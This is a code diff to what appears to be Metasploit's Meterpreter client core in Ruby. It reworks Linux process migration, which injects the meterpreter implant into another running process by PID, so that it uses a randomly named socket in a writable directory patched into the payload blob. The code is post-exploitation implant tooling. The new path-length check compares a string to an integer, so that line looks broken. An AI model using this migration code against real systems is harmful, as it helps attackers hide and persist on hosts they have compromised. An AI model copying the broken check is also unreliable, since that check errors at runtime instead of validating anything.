@@ -25,6 +25,9 @@ module Meterpreter
 ###
 class ClientCore < Extension
 
+  UNIX_PATH_MAX = 108
+  DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"
+
   #
   # Initializes the 'core' portion of the meterpreter client commands.
   #
@@ -180,7 +183,7 @@ class ClientCore < Extension
   # Migrates the meterpreter instance to the process specified
   # by pid.  The connection to the server remains established.
   #
-  def migrate(pid, socket_path="/tmp/meterpreter.sock")
+  def migrate(pid, writable_dir="/tmp/")
     keepalive = client.send_keepalives
     client.send_keepalives = false
     process       = nil
@@ -216,23 +219,44 @@ class ClientCore < Extension
     end
 
     if client.platform =~ /linux/
-      if socket_path.blank?
-        socket_path = "/tmp/meterpreter.sock"
+      if writable_dir.blank?
+        writable_dir = "/tmp/"
       end
 
-      socket_dir = ::File.dirname(socket_path)
-      stat_dir = client.fs.filestat.new(socket_dir)
+      stat_dir = client.fs.filestat.new(writable_dir)
 
       unless stat_dir.directory?
-        raise RuntimeError, "Directory #{socket_dir} not found", caller
+        raise RuntimeError, "Directory #{writable_dir} not found", caller
       end
       # Rex::Post::FileStat#writable? isn't available
     end
 
-    blob = generate_payload_stub(client, process, socket_path)
+    blob = generate_payload_stub(client, process)
 
     # Build the migration request
     request = Packet.create_request( 'core_migrate' )
+
+    if client.platform =~ /linux/i
+      socket_path = File.join(writable_dir, Rex::Text.rand_text_alpha_lower(5 + rand(5)))
+
+      if socket_path > UNIX_PATH_MAX - 1
+        raise RuntimeError, "The writable dir is too long", caller
+      end
+
+      pos = blob.index(DEFAULT_SOCK_PATH)
+
+      if pos.nil?
+        raise RuntimeError, "The meterpreter binary is wrong", caller
+      end
+
+      blob[pos, socket_path.length + 1] = socket_path + "\x00"
+
+      ep = elf_ep(blob)
+      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
+      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
+      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
+    end
+
     request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
     request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
     request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
@@ -240,13 +264,6 @@ class ClientCore < Extension
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
     else
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
-    end
-
-    if client.platform =~ /linux/i
-      ep = elf_ep(blob)
-      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
-      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
-      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
     end
 
     # Send the migration request (bump up the timeout to 60 seconds)
@@ -344,12 +361,12 @@ class ClientCore < Extension
 
   private
 
-  def generate_payload_stub(client, process, socket_path)
+  def generate_payload_stub(client, process)
     case client.platform
     when /win/i
       blob = generate_windows_stub(client, process)
     when /linux/i
-      blob = generate_linux_stub(socket_path)
+      blob = generate_linux_stub
     else
       raise RuntimeError, "Unsupported platform '#{client.platform}'"
     end
@@ -405,20 +422,11 @@ class ClientCore < Extension
     blob
   end
 
-  def generate_linux_stub(socket_path)
-    pos = nil
+  def generate_linux_stub
     file = ::File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
     blob = ::File.open(file, "rb") {|f|
       f.read(f.stat.size)
     }
-
-    unless socket_path.blank?
-      pos = blob.index("/tmp/meterpreter.sock")
-    end
-
-    unless pos.nil?
-      blob[pos, socket_path.length + 1] = socket_path + "\x00"
-    end
 
     blob
   end
